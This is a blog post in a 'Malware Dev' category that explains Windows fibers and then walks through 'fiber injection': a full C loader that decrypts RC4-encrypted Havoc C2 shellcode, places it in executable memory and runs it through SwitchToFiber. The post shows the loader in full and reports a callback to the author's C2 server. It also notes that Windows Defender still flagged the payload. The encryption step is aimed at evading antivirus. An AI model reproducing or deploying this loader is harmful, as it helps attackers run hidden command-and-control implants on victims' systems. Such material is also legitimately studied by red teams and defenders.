+++ 
draft = false
date = 2020-02-11T22:47:27+10:00
title = "Fiber Injection"
description = ""
slug = ""
authors = ["Bugs Bunny"]
tags = []
categories = ["Malware Dev"]
externalLink = ""
series = []
+++

We all know threads — those small, poor workers who execute code for a process. A thread is the smallest unit of execution within a process.

But have you ever heard of something called a fiber?

No, I’m not talking about the dietary stuff you get from fruits and vegetables.

So what on earth am I talking about?

<meme image >

<H1>what is a fiber ?</H1>

So Fibers are a unit of execution same as threads BUT it is manually scheduled by the application here is some facts about them : 

- User-mode only: Fibers are controlled entirely from user mode so they’re invisible to the kernel. That means you, the developer, control when they run.  
- One thread can run many fibers: A single thread can create multiple fibers and switch between them whenever it wants using the WinAPI function SwitchToFiber
- No parallelism unless you do the work: Fibers do not run in parallel on multi-core CPUs unless you explicitly run them on multiple threads.
- Lightweight and efficient: Fibers consume very few system resources. They're much cheaper and lighter than threads when it comes to executing code.

They're no longer widely used nowadays — because who on earth wants to create an application and do all the heavy lifting themselves, like managing code execution, scheduling, creating threads for parallelism, and manually switching between fibers? 

🤓☝️:"Actually, I use fibers when developing applications."

Ok they are rarely used today mr Actually. 




<H1>Fiber injection </H1>

Fiber injection is basically making the fiber execute our shellcode, instead of using threads like the [CreateThread](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread) WinAPI.

To start our journey, I’m already one step ahead — my Havoc C2 is up and waiting:

<img src="/images/fiber-injection/havoc-pre.jpg" alt="ARE U BLIND?  NOT MY FAULT THE IMAGE IS NOT LOADING"
     style="border-radius: 0 !important; clip-path: none !important; width: auto; height: auto;">

Note: My shellcode is encrypted with RC4. I used [Hellshell](https://github.com/NUL0x4C/HellShell) to encrypt it for me.

Everything will be done inside the main function — though you could move this into a separate function if you want (I’m just too lazy to bother right now).

First, we need to convert the current thread into a fiber. You can’t create a fiber and switch to it unless the calling thread is already a fiber. That’s why we convert the current thread using [ConvertThreadToFiber](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-convertthreadtofiber).

After that, I’ll allocate memory in the current process to store my shellcode. And since I’m lazy, I’m going to directly set the protection to PAGE_EXECUTE_READWRITE during VirtualAlloc, instead of doing it the “proper” way with [VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect) and changing the memory protection afterward.

{{< highlight c >}}


	PVOID fiber1 = ConvertThreadToFiber(NULL);

	if (fiber1 == NULL) {
		printf("[-] Failed to convert thread to fiber.\n");
		return 1;
	}

	// allocating memory for the shellcode

	PVOID address = VirtualAlloc(0, sizeof(Rc4CipherText), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);


{{< /highlight >}}

Then we’ll create a new fiber that points to the memory we allocated. So when we switch to it, it’ll start executing the code at that memory address.

Rc4EncryptionViSystemFunc032 is just a function I use to decrypt the Havoc shellcode. After decrypting it, I’ll simply copy the shellcode into the allocated memory.

{{< highlight c >}}

    // creating another fiber
	PVOID fiber2 = CreateFiber(NULL, (LPFIBER_START_ROUTINE)address, NULL);

	if (!fiber2) {
		printf("[-] Failed to create fiber.\n");
		return 1;
	}

	// decrypting the shellcode
	Rc4EncryptionViSystemFunc032(Rc4Key, Rc4CipherText, sizeof(Rc4Key), sizeof(Rc4CipherText));

	// copying the shellcode into the allocated memory 
	memcpy(address, Rc4CipherText, sizeof(Rc4CipherText));


{{< /highlight >}}

Lastly, we’ll just switch to the fiber2 we created. Once you switch to the fiber, it will execute the shellcode.

{{< highlight c >}}

 	// when switching the fiber 2 it will start executing the shellcode that's stored in the allocated memory 
	SwitchToFiber(fiber2);

	return 0;


{{< /highlight >}}


The full code :

{{< highlight c >}}


#include <windows.h>
#include <stdio.h>


// this is what SystemFunction032 function take as a parameter
typedef struct
{
	DWORD	Length;
	DWORD	MaximumLength;
	PVOID	Buffer;

} USTRING;

// defining how does the function look - more on this structure in the api hashing part
typedef NTSTATUS(NTAPI* fnSystemFunction032)(
	struct USTRING* Img,
	struct USTRING* Key
	);

BOOL Rc4EncryptionViSystemFunc032(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {

	// the return of SystemFunction032
	NTSTATUS	STATUS = NULL;

	// making 2 USTRING variables, 1 passed as key and one passed as the block of data to encrypt/decrypt
	USTRING		Key = { .Buffer = pRc4Key, 		.Length = dwRc4KeySize,		.MaximumLength = dwRc4KeySize },
		Img = { .Buffer = pPayloadData, 	.Length = sPayloadSize,		.MaximumLength = sPayloadSize };


	// since SystemFunction032 is exported from Advapi32.dll, we load it Advapi32 into the prcess,
	// and using its return as the hModule parameter in GetProcAddress
	fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)GetProcAddress(LoadLibraryA("Advapi32"), "SystemFunction032");

	// if SystemFunction032 calls failed it will return non zero value
	if ((STATUS = SystemFunction032(&Img, &Key)) != 0x0) {
		printf("[!] SystemFunction032 FAILED With Error : 0x%0.8X\n", STATUS);
		return FALSE;
	}

	return TRUE;
}

// my encrypted shellcode it's huge so i won't fill half the blog showing it 
unsigned char Rc4CipherText[] = {
	0xB0, 0x94, 0xE1, 0x89, 0x90, 0xE0, 0x5B, 0xE7, .....} 

unsigned char Rc4Key[] = {
	0x90, 0x4B, 0x51, 0x4D, 0x24, 0x6A, 0xA4, 0x83, 0x36, 0x5D, 0x96, 0x8F, 0xA4, 0x96, 0x9D, 0xA4 };



   int main() {


	// converts curretn thread to a fiber 

	PVOID fiber1 = ConvertThreadToFiber(NULL);

	if (fiber1 == NULL) {
		printf("[-] Failed to convert thread to fiber.\n");
		return 1;
	}

	// allocating memory for the shellcode

	PVOID address = VirtualAlloc(0, sizeof(Rc4CipherText), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	// creating another fiber 

	PVOID fiber2 = CreateFiber(NULL, (LPFIBER_START_ROUTINE)address, NULL);

	if (!fiber2) {
		printf("[-] Failed to create fiber.\n");
		return 1;
	}

	// decrypting the shellcode
	Rc4EncryptionViSystemFunc032(Rc4Key, Rc4CipherText, sizeof(Rc4Key), sizeof(Rc4CipherText));

	// copying the shellcode into the allocated memory 
	memcpy(address, Rc4CipherText, sizeof(Rc4CipherText));

	// when switching the fiber 2 it will start executing the shellcode that's stored in the allocated memory 
	SwitchToFiber(fiber2);

	return 0;

}


{{< /highlight >}}


After execution, we got a connection back to our Havoc C2:


<img src="/images/fiber-injection/havoc-connect.jpg" alt="ARE U BLIND?  NOT MY FAULT THE IMAGE IS NOT LOADING"
     style="border-radius: 0 !important; clip-path: none !important; width: auto; height: auto;">


Note: Even with RC4 encryption, Windows Defender ruined the moment and detected the shellcode anyway.

<img src="/images/fiber-injection/windef.jpg" alt="ARE U BLIND?  NOT MY FAULT THE IMAGE IS NOT LOADING"
     style="border-radius: 0 !important; clip-path: none !important; width: auto; height: auto;">

<img src="/images/fiber-injection/windef-meme.jpg" alt="ARE U BLIND?  NOT MY FAULT THE IMAGE IS NOT LOADING"
     style="border-radius: 0 !important; clip-path: none !important; width: auto; height: auto;">


Anyway, that’s all folks. I need to go eat instead of writing stuff that gets detected by Windows Defender.

<img src="/images/fiber-injection/ending.jpg" alt="ARE U BLIND? NOT MY FAULT THE IMAGE IS NOT LOADING"
     style="border-radius: 0 !important; clip-path: none !important; width: auto; height: auto;">



References:
- https://devblogs.microsoft.com/oldnewthing/20191011-00/?p=102989
- https://learn.microsoft.com/en-us/windows/win32/procthread/fibers
- https://github.com/Kudaes/Fiber